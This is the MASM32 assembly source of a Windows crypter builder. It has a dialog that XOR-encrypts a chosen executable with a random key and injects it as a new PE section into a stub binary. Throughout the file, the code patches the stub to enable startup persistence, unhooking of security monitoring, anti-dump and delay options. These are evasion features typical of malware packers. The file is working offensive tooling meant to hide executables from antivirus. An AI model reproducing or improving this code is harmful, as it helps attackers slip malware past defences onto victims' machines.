.386
.model flat, stdcall
option casemap :none

include windows.inc
include kernel32.inc
include user32.inc
include Comctl32.inc
include shell32.inc
include comdlg32.inc
include shlwapi.inc
include gdi32.inc
include  WaveObject.asm
includelib kernel32.lib
includelib user32.lib
includelib Comctl32.lib
includelib shell32.lib
includelib comdlg32.lib
includelib shlwapi.lib
includelib gdi32.lib
IDC_BTNPACK      equ 1004
IDC_EDITPATH     equ 1003
IDC_BTNOPEN      equ 1005
IDC_IMG1      equ 105

DlgProc PROTO :HWND, :UINT, :WPARAM, :LPARAM

.const
    IDD_DIALOG1    equ 101

.data

 	szBitmapPath db "Res\header.bmp",0
    szFilter       db "Executable Files (*.exe)", 0, "*.exe", 0, 0
    ofn            OPENFILENAME <>
    sfn            OPENFILENAME <>
    szFile         db 260 dup(0)
    szSaveFile     db 260 dup(0)
    szFileName     db 260 dup(0)
	szExe          db ".exe", 0
    szMsg          db "Please select a file first!", 0
    szCaption      db "Error", 0
    szSuccess      db "Successfully saved file to: ", 0
    szSuccessMsg   db 512 dup(0)
    szSuccessCaption db "Success", 0
    szSaveTitle    db "Save Packed File", 0
    startInfo      STARTUPINFO <?>
    procInfo       PROCESS_INFORMATION <?>
    szCurrentDir   db 260 dup(0)
    szWorkingDir   db 260 dup(0)
    szTempFile db "stub.tmp", 0
	stub_file    db "stub.bin", 0
	str_startup_nop   db "STARTUP_NOP", 0
	str_startup_yes   db "STARTUP_YES", 0
	str_unhook_nop    db "UNHOOK_NOP", 0
	str_unhook_yes    db "UNHOOK_YES", 0
	str_antidump_nop  db "ANTIDUMP_NOP", 0
	str_antidump_yes  db "ANTIDUMP_YES", 0
	str_delay_nop     db "DELAY_NOP", 0
	str_delay_yes     db "DELAY_YES", 0
	str_secret        db "SECRET", 0
	output_file db "payload.xyris", 0
	
Rndm			dd	0
B32Chars		db	"ABCDEFGHIJKLMNOPQRSTUVXYZ",0


.data?
	stub_path 	   dd ?
    hInstance      dd ?
    hWnd           dd ?
	input_data dd ?
	input_size dd ?
	output_buffer dd ?
	file_buffer db 10000h dup(?)
	input_payload dd ?
	payload_size dd ?
	stWaveObj   WAVE_OBJECT <?>
	xWin dd ?
	hBitmap dd ?
	bitmp dd ?
	szKey	db	100h	dup(?)
	szSection	db	100h	dup(?)
.code
start:
    invoke GetModuleHandle, NULL
    mov hInstance, eax
    invoke InitCommonControls
    invoke DialogBoxParam, hInstance, IDD_DIALOG1, NULL, addr DlgProc, NULL
    invoke ExitProcess, 0

;Randomize and GenRandomNumbers -> https://github.com/Xyl2k/Xylitol-MASM32-snippets/blob/master/Random/Numbers-letters/keygen.asm
Randomize PROC uses ecx
	invoke	GetTickCount
	add Rndm,eax
	add Rndm,eax
	add Rndm,'abcd'
	Rol Rndm,1
	mov eax,Rndm
;	imul eax,'seed'
	Ret
Randomize ENDP
GenRandomNumbers	PROC uses ebx	pIn:DWORD,pLen:DWORD
	mov edi,pIn
	mov ebx,pLen
	.repeat
		invoke	Randomize
		mov ecx,26			
		xor edx,edx
		idiv ecx
		movzx eax,byte ptr [edx+B32Chars]
		stosb
		dec ebx
	.until zero?
	Ret
GenRandomNumbers ENDP


align_to PROC val:DWORD, alignment:DWORD
    mov eax, val
    add eax, alignment
    dec eax
    xor edx, edx
    div alignment
    mul alignment
    ret
align_to ENDP

read_file PROC filepath:DWORD
    LOCAL hFile:HANDLE
    LOCAL bytes_read:DWORD
    LOCAL hHeap:HANDLE
    
    invoke GetProcessHeap
    mov hHeap, eax
    
    invoke CreateFileA, filepath, GENERIC_READ, FILE_SHARE_READ,\
                       NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    
    .if eax == INVALID_HANDLE_VALUE
        xor eax, eax
        ret
    .endif
    mov hFile, eax
    
    invoke GetFileSize, hFile, NULL
    mov input_size, eax
    
    invoke HeapAlloc, hHeap, HEAP_ZERO_MEMORY, input_size
    .if eax == 0
        invoke CloseHandle, hFile
        xor eax, eax
        ret
    .endif
    mov input_data, eax
    
    invoke ReadFile, hFile, input_data, input_size,\
                    addr bytes_read, NULL
    
    mov eax, bytes_read
    cmp eax, input_size
    je read_ok
    
    invoke HeapFree, hHeap, 0, input_data
    invoke CloseHandle, hFile
    xor eax, eax
    ret
    
read_ok:
    invoke CloseHandle, hFile
    mov eax, 1
    ret
read_file ENDP

add_section PROC target_file:DWORD
    LOCAL hFile:HANDLE
    LOCAL hMapping:HANDLE
    LOCAL pMapping:DWORD
    LOCAL section_align:DWORD
    LOCAL file_align:DWORD
    LOCAL last_section:DWORD
    LOCAL new_section:DWORD
    LOCAL file_size:DWORD
    LOCAL aligned_size:DWORD
    
    invoke CreateFileA, target_file, GENERIC_READ or GENERIC_WRITE,\
                       FILE_SHARE_READ or FILE_SHARE_WRITE, NULL,\
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    .if eax == INVALID_HANDLE_VALUE
        xor eax, eax
        ret
    .endif
    mov hFile, eax
    
    invoke GetFileSize, hFile, NULL
    mov file_size, eax
    
    mov eax, input_size
    add eax, 1000h
    add eax, file_size
    mov aligned_size, eax
    
    invoke CreateFileMappingA, hFile, NULL, PAGE_READWRITE, 0, aligned_size, NULL
    .if eax == 0
        invoke CloseHandle, hFile
        xor eax, eax
        ret
    .endif
    mov hMapping, eax
    
    invoke MapViewOfFile, hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
    .if eax == 0
        invoke CloseHandle, hMapping
        invoke CloseHandle, hFile
        xor eax, eax
        ret
    .endif
    mov pMapping, eax
    
    mov ebx, pMapping
    mov eax, [ebx + 3Ch]        ; e_lfanew
    .if eax == 0
        invoke UnmapViewOfFile, pMapping
        invoke CloseHandle, hMapping
        invoke CloseHandle, hFile
        xor eax, eax
        ret
    .endif
    add ebx, eax               ; PE header
    
    xor ecx, ecx
    mov cx, word ptr [ebx + 6]  ; NumberOfSections
    mov eax, ebx
    add eax, 18h               ; Optional header
    movzx edx, word ptr [ebx + 14h]
    add eax, edx               ; Section headers
    
    dec ecx
    imul edx, ecx, 28h
    add eax, edx
    mov last_section, eax
    

    mov esi, ebx
    add esi, 18h
    mov eax, [esi + 38h]      ; Section alignment
    mov section_align, eax
    mov eax, [esi + 3Ch]      ; File alignment
    mov file_align, eax
    
    mov edi, last_section
    add edi, 28h
    mov new_section, edi
    
    push edi
    lea esi, szSection
    mov ecx, 8
    rep movsb
    pop edi
    
    mov eax, input_size
    mov [edi + 8], eax        ; VirtualSize
    
    mov esi, last_section
    mov edx, [esi + 0Ch]      ; Last section VirtualAddress
    mov eax, [esi + 8]        ; Last section VirtualSize
    add edx, eax
    
    invoke align_to, edx, section_align
    mov edx, new_section
    mov [edx + 0Ch], eax      ; VirtualAddress
    
    mov eax, input_size
    invoke align_to, eax, file_align
    mov edx, new_section
    mov [edx + 10h], eax      ; SizeOfRawData
    
    mov esi, last_section
    mov eax, [esi + 14h]      ; Last section PointerToRawData
    mov ecx, [esi + 10h]      ; Last section SizeOfRawData
    add eax, ecx
    invoke align_to, eax, file_align
    mov edx, new_section
    mov [edx + 14h], eax      ; PointerToRawData
    
    mov edx, new_section
    mov eax, IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE or IMAGE_SCN_CNT_INITIALIZED_DATA 
    mov [edx + 24h], eax      ; Characteristics
    
    mov cx, word ptr [ebx + 6]
    inc cx
    mov word ptr [ebx + 6], cx ; Increment NumberOfSections
    
    mov edx, new_section
    mov eax, [edx + 0Ch]      ; New section VirtualAddress
    add eax, [edx + 8]        ; Add VirtualSize
    invoke align_to, eax, section_align
    mov edx, ebx
    add edx, 18h
    mov [edx + 38h], eax      ; SizeOfImage
    
    ; Copy section data
    mov esi, input_data
    mov edi, pMapping
    mov edx, new_section
    mov eax, [edx + 14h]      ; PointerToRawData
    add edi, eax
    
    mov ecx, input_size
    rep movsb
     
   mov eax, input_size
    xor edx, edx
    div file_align           
    .if edx != 0            
        mov ecx, file_align
        sub ecx, edx         
        xor al, al
        rep stosb            
    .endif
   
    invoke FlushViewOfFile, pMapping, 0
    invoke UnmapViewOfFile, pMapping
    invoke CloseHandle, hMapping
    invoke CloseHandle, hFile
    
    mov eax, 1
    ret
add_section ENDP

strlen PROC string:DWORD
    LOCAL len:DWORD
    mov len, 0
    mov edx, string
@count_loop:
    mov al, byte ptr [edx]
    test al, al
    jz @done
    inc edx
    inc len
    jmp @count_loop
@done:
    mov eax, len
    ret
strlen ENDP

replace_string PROC uses esi edi dest:DWORD, src:DWORD, len:DWORD
    mov edi, dest
    mov esi, src
    mov ecx, len
    rep movsb
    ret
replace_string ENDP

process_pattern PROC uses ebx esi edi data:DWORD, dataSize:DWORD, search:DWORD, replace:DWORD
    LOCAL searchLen:DWORD
    LOCAL found:DWORD
    
    mov found, 0

    invoke strlen, search
    mov searchLen, eax
    

    mov esi, data
    mov ecx, dataSize
    sub ecx, searchLen
    inc ecx
    
@scan_loop:
    push ecx
    mov edi, search
    mov ecx, searchLen
    push esi
    repe cmpsb
    pop esi
    je @found_pattern
    pop ecx
    inc esi
    loop @scan_loop
    jmp @pattern_done
    
@found_pattern:
    pop ecx
    

    mov eax, esi
    sub eax, data

    invoke replace_string, esi, replace, searchLen

    mov eax, esi
    sub eax, data
    mov found, 1
    
@pattern_done:
    mov eax, found
    ret
process_pattern ENDP

scan_and_replace PROC uses ebx esi edi hFile:HANDLE, startup:DWORD, unhook:DWORD, antidump:DWORD,delay:DWORD, key:DWORD
    LOCAL hMapping:HANDLE
    LOCAL fileData:DWORD
    LOCAL fileSize:DWORD
    LOCAL found:DWORD
    
    mov found, 0
    


    invoke GetFileSize, hFile, NULL
    mov fileSize, eax
    

    invoke CreateFileMappingA, hFile, NULL, PAGE_READWRITE, 0, 0, NULL
 
    mov hMapping, eax

    invoke MapViewOfFile, hMapping, FILE_MAP_WRITE, 0, 0, 0
    .if eax == NULL
        invoke CloseHandle, hMapping
        ret
    .endif
    mov fileData, eax
    
    
    .if startup
        invoke process_pattern, fileData, fileSize,\
               offset str_startup_nop, offset str_startup_yes
        .if eax == 1
            mov found, 1
        .endif
    .endif
    
    .if unhook
        invoke process_pattern, fileData, fileSize,\
               offset str_unhook_nop, offset str_unhook_yes
        .if eax == 1
            mov found, 1
        .endif
    .endif
    
    .if antidump
        invoke process_pattern, fileData, fileSize,\
               offset str_antidump_nop, offset str_antidump_yes
        .if eax == 1
            mov found, 1
        .endif
    .endif
    
    .if delay
        invoke process_pattern, fileData, fileSize,\
               offset str_delay_nop, offset str_delay_yes
        .if eax == 1
            mov found, 1
        .endif
    .endif
    
 
    .if key != 0
        invoke process_pattern, fileData, fileSize,\
               offset str_secret, key
        .if eax == 1
            mov found, 1
        .endif
    .endif
    
 
    invoke FlushViewOfFile, fileData, 0
    invoke UnmapViewOfFile, fileData
    invoke CloseHandle, hMapping
    
    mov eax, found
    ret
scan_and_replace ENDP


CopyMemory PROC uses edi esi ecx dest:DWORD, src:DWORD, len:DWORD
    mov edi, dest
    mov esi, src
    mov ecx, len
    rep movsb
    ret
CopyMemory ENDP

Decrypt PROC uses eax esi edi ebx section:DWORD, size_var:DWORD, outBuffer:DWORD
    LOCAL currentPos:DWORD
    LOCAL remainingBytes:DWORD
    LOCAL currentChunk:DWORD
    LOCAL keyIndex:DWORD
    LOCAL bytesProcessed:DWORD
    LOCAL buffer[4096]:BYTE
    
    mov esi, section
    mov keyIndex, 0
    mov eax, size_var
    mov remainingBytes, eax
    mov eax, outBuffer
    mov currentPos, eax
    mov bytesProcessed, 0
    
    .while remainingBytes > 0
        mov eax, remainingBytes
        .if eax > 4096
            mov eax, 4096
        .endif
        mov currentChunk, eax
        
        mov edx, keyIndex
        mov ecx, currentChunk
        lea edi, buffer
        
        .while ecx > 0
            mov al, [esi]
            xor al, byte ptr szKey[edx]
            mov [edi], al
            
            inc esi
            inc edi
            inc edx
            .if edx >= 6
                xor edx, edx
            .endif
            dec ecx
        .endw
        
        mov keyIndex, edx
        
        invoke CopyMemory, currentPos, addr buffer, currentChunk
        
        mov eax, currentChunk
        add currentPos, eax
        add bytesProcessed, eax
        sub remainingBytes, eax
    .endw
    ret
Decrypt ENDP

save_file PROC filepath:DWORD, buffer:DWORD, size_val:DWORD
    LOCAL hFile:HANDLE
    LOCAL bytes_written:DWORD
    
    invoke CreateFileA, filepath, GENERIC_WRITE, 0, NULL,\
                       CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    
    .if eax == INVALID_HANDLE_VALUE
        xor eax, eax
        ret
    .endif
    mov hFile, eax
    
    invoke WriteFile, hFile, buffer, size_val,\
                     addr bytes_written, NULL
                     
    invoke CloseHandle, hFile
    mov eax, 1
    ret
save_file ENDP
DlgProc PROC hWin:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
   LOCAL wID:WORD
   LOCAL hFile:HANDLE
   LOCAL bytes_read:DWORD
   LOCAL startup:DWORD
   LOCAL unhook:DWORD
   LOCAL delay:DWORD
   LOCAL antidump:DWORD
   LOCAL hHeap:HANDLE
   LOCAL hBit:HANDLE
   LOCAL @stPs:PAINTSTRUCT
   LOCAL @hDc:HDC 
   LOCAL @stRect:RECT
   LOCAL hMemDC:HDC
   LOCAL @stBmp:BITMAP
   
   mov eax, uMsg
   .if eax == WM_INITDIALOG
       push hWin
       pop hWnd
  
       invoke LoadImage, NULL, addr szBitmapPath, IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE or LR_DEFAULTSIZE
       .if eax != NULL
           mov hBitmap, eax  
           invoke GetDlgItem, hWin, IDC_IMG1
           push hBitmap
           invoke _WaveInit, addr stWaveObj, eax, hBitmap, 25, 0
           .if eax
               call _Quit
           .endif
           pop hBitmap
           invoke _WaveEffect, addr stWaveObj, 1, 5, 4, 293
       .endif
       
   .elseif eax == WM_PAINT
       invoke BeginPaint, hWin, addr @stPs
       mov @hDc, eax
       invoke CreateCompatibleDC, @hDc
       mov hMemDC, eax
       invoke SelectObject, hMemDC, hBitmap
       invoke GetClientRect, hWin, addr @stRect
       invoke DeleteDC, hMemDC
       invoke _WaveUpdateFrame, addr stWaveObj, eax, TRUE
       invoke EndPaint, hWin, addr @stPs
       
   .elseif eax == WM_COMMAND
       mov eax, wParam
       mov wID, ax
       
       .if wID == IDC_BTNOPEN
       
  		   invoke GenRandomNumbers,addr szKey, 6
  		   invoke GenRandomNumbers,addr szSection, 6
 
      
           mov ofn.lStructSize, sizeof OPENFILENAME
           push hWin
           pop ofn.hwndOwner
           push hInstance
           pop ofn.hInstance
           mov ofn.lpstrFilter, offset szFilter
           mov ofn.lpstrFile, offset szFile
           mov ofn.nMaxFile, sizeof szFile
           mov ofn.Flags, OFN_FILEMUSTEXIST or OFN_PATHMUSTEXIST or OFN_HIDEREADONLY
           
           invoke GetOpenFileName, addr ofn
           .if eax != 0
               invoke SetDlgItemText, hWin, IDC_EDITPATH, addr szFile
           .endif
           
       .elseif wID == IDC_BTNPACK
           invoke GetDlgItemText, hWin, IDC_EDITPATH, addr szFile, sizeof szFile
           .if eax == 0
               invoke MessageBox, hWin, addr szMsg, addr szCaption, MB_ICONERROR
           .else
               invoke read_file, addr szFile  
               .if eax == 0
                   jmp @process_done
               .endif

               invoke GetProcessHeap
               mov hHeap, eax
               
               invoke HeapAlloc, hHeap, HEAP_ZERO_MEMORY, input_size
               mov output_buffer, eax
               
               invoke Decrypt, input_data, input_size, output_buffer
               invoke save_file, addr output_file, output_buffer, input_size
               
               invoke HeapFree, hHeap, 0, output_buffer
               invoke HeapFree, hHeap, 0, input_data

               invoke CopyFileA, addr stub_file, addr szTempFile, FALSE
               .if eax == 0
                   invoke DeleteFileA, addr output_file
                   jmp @process_done
               .endif

               invoke CreateFileA, addr szTempFile,\
                      GENERIC_READ or GENERIC_WRITE,\
                      FILE_SHARE_READ or FILE_SHARE_WRITE,\
                      NULL,\
                      OPEN_EXISTING,\
                      FILE_ATTRIBUTE_NORMAL,\
                      NULL
               
               .if eax == INVALID_HANDLE_VALUE
                   invoke DeleteFileA, addr szTempFile
                   invoke DeleteFileA, addr output_file
                   jmp @process_done
               .endif
               mov hFile, eax

               invoke IsDlgButtonChecked, hWin, 1007
               .if eax == BST_CHECKED
                   mov startup, 1
               .else
                   mov startup, 0
               .endif

               invoke IsDlgButtonChecked, hWin, 1008
               .if eax == BST_CHECKED
                   mov unhook, 1
               .else
                   mov unhook, 0
               .endif

               invoke IsDlgButtonChecked, hWin, 1009
               .if eax == BST_CHECKED
                   mov delay, 1
               .else
                   mov delay, 0
               .endif

               invoke IsDlgButtonChecked, hWin, 1010
               .if eax == BST_CHECKED
                   mov antidump, 1
               .else
                   mov antidump, 0
               .endif

               invoke scan_and_replace, hFile,\
                           startup,\
                           unhook,\
                           antidump,\
                           delay,\
                           addr szKey

               invoke CloseHandle, hFile

               invoke read_file, addr output_file
               .if eax == 0
                   invoke DeleteFileA, addr szTempFile
                   invoke DeleteFileA, addr output_file
                   jmp @process_done
               .endif
               
               invoke add_section, addr szTempFile
               .if eax == 0
                   invoke GetProcessHeap
                   push eax
                   invoke HeapFree, eax, 0, input_data
                   pop eax
                   invoke DeleteFileA, addr szTempFile
                   invoke DeleteFileA, addr output_file
                   jmp @process_done
               .endif

               mov sfn.lStructSize, sizeof OPENFILENAME
               push hWin
               pop sfn.hwndOwner
               push hInstance
               pop sfn.hInstance
               mov sfn.lpstrFilter, offset szFilter
               mov sfn.lpstrFile, offset szSaveFile
               mov sfn.nMaxFile, sizeof szSaveFile
               mov sfn.lpstrDefExt, offset szExe + 1
               mov sfn.Flags, OFN_PATHMUSTEXIST or OFN_OVERWRITEPROMPT
               mov sfn.lpstrTitle, offset szSaveTitle
               mov byte ptr [szSaveFile], 0
               
               invoke GetSaveFileName, addr sfn
               .if eax != 0
                   invoke CopyFileA, addr szTempFile, addr szSaveFile, FALSE
                   invoke DeleteFileA, addr szTempFile
                   invoke lstrcpy, addr szSuccessMsg, addr szSuccess
                   invoke lstrcat, addr szSuccessMsg, addr szSaveFile
                   invoke MessageBox, hWin, addr szSuccessMsg, addr szSuccessCaption, MB_ICONINFORMATION
               .else
                   invoke DeleteFileA, addr szTempFile
               .endif
           .endif

       @process_done:
       .endif

   .elseif eax == WM_LBUTTONDOWN
       mov eax, lParam
       movzx ecx, ax      
       shr eax, 16        
       invoke _WaveDropStone, addr stWaveObj, ecx, eax, 2, 256
       
   .elseif eax == WM_CLOSE
       invoke _WaveFree, addr stWaveObj
       invoke DeleteObject, hBitmap
       invoke EndDialog, hWin, 0
       
   .else
       mov eax, FALSE
       ret
   .endif
   
   mov eax, TRUE
   ret

DlgProc ENDP

_Quit proc
   invoke _WaveFree, addr stWaveObj
   invoke DestroyWindow, hWnd
   invoke PostQuitMessage, NULL
   ret
_Quit ENDP
END start
